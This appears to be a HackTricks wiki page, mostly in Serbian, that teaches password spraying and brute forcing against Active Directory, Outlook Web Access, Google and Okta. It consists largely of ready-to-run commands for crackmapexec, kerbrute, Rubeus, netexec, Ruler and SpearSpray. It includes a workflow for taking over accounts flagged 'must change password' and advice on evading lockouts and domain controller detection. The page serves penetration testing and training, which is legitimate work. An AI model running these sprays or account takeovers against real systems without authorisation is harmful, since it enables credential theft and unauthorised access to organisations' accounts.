# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Kada pronađete nekoliko **valid usernames** možete za svakog otkrivenog korisnika pokušati najčešće **common passwords** (imajte u vidu password policy okruženja).\
Po **default**-u, **minimum** **password** **length** je **7**.

Liste **common usernames** takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Imajte na umu da možete **lockout some accounts if you try several wrong passwords** (po **default**-u više od 10).

### Dobijanje password policy

Ako imate user credentials ili shell kao domain user možete **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploatacija sa Linuxa (ili sa bilo kog OS-a)

- Korišćenje **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Koristeći [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(možete navesti broj pokušaja da biste izbegli zaključavanja naloga):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NE PREPORUČUJE SE; PONEKAD NE RADI
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Pomoću modula `scanner/smb/smb_login` iz **Metasploit**:

![](<../../images/image (745).png>)

- Koristeći **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Iz Windowsa

- Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom koja ima brute modul:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Korišćenjem [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Po defaultu može da generiše korisnike iz domena, da preuzme politiku lozinki iz domena i da ograniči pokušaje u skladu sa njom):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Uz [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifikovati i preuzeti naloge sa "Password must change at next logon" (SAMR)

Jedna nisko-bučna tehnika je primena password spraying-a benignom/praznom lozinkom i otkrivanje naloga koji vraćaju STATUS_PASSWORD_MUST_CHANGE, što ukazuje da je lozinka prisilno istekla i može se promeniti bez poznavanja stare.

Tok rada:
- Enumerišite korisnike (RID brute via SAMR) kako biste izgradili listu ciljeva:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray praznu lozinku i nastavi dalje na pogodcima da bi uhvatio naloge koji moraju da promene lozinku pri sledećem logonu:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Za svaki hit, promenite lozinku preko SAMR-a koristeći NetExec’s module (stara lozinka nije potrebna kada je "must change" postavljeno):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operativne napomene:
- Osigurajte da je sat vašeg hosta sinhronizovan sa DC pre operacija zasnovanih na Kerberosu: `sudo ntpdate <dc_fqdn>`.
- Znak [+] bez (Pwn3d!) u nekim modulima (npr. RDP/WinRM) znači da su kredencijali validni, ali nalog nema prava za interaktivnu prijavu.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying smanjuje šum u odnosu na SMB/NTLM/LDAP bind pokušaje i bolje se uklapa sa AD lockout politikama. SpearSpray spaja LDAP-driven targeting, pattern engine i svest o politikama (domain policy + PSOs + badPwdCount buffer) da bi spray-ovao precizno i bezbedno. Takođe može da tag-uje kompromitovane principle u Neo4j za BloodHound pathing.

Key ideas:
- LDAP user discovery sa paging-om i LDAPS podrškom, opciono koristeći custom LDAP filters.
- Domain lockout policy + PSO-aware filtriranje da bi se ostavio konfigurisani buffer pokušaja (threshold) i izbeglo zaključavanje korisnika.
- Kerberos pre-auth validation koristeći fast gssapi bindings (generiše 4768/4771 na DCs umesto 4625).
- Pattern-based, per-user password generation koristeći varijable kao što su names i temporal values izvedene iz svakog user-ovog pwdLastSet.
- Throughput control sa threads, jitter i max requests per second.
- Optional Neo4j integration za označavanje kompromitovanih korisnika za BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciljanje i kontrola obrazaca:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Kontrole prikrivanja i bezbednosti:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound obogaćivanje:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pregled sistema obrazaca (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Dostupne promenljive uključuju:
- {name}, {samaccountname}
- Vremenske vrednosti iz pwdLastSet svakog korisnika (ili whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Pomoćne promenljive za kompoziciju i org token: {separator}, {suffix}, {extra}

Operativne napomene:
- Preferirajte upite prema PDC-emulatoru sa -dc da biste pročitali najautoritativniji badPwdCount i informacije vezane za politiku.
- Resetovanje badPwdCount se pokreće pri sledećem pokušaju nakon perioda posmatranja; koristite prag i tajming da ostanete bezbedni.
- Pokušaji Kerberos pre-auth se pojavljuju kao 4768/4771 u DC telemetriji; koristite jitter i rate-limiting da se uklopite.

> Savet: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Postoji više alata za p**assword spraying outlook**.

- Sa [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Sa [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Sa [Ruler](https://github.com/sensepost/ruler) (pouzdan!)
- Sa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Sa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Za korišćenje bilo kog od ovih alata, potrebna vam je lista korisnika i jedna lozinka / mala lista lozinki za password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Reference

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
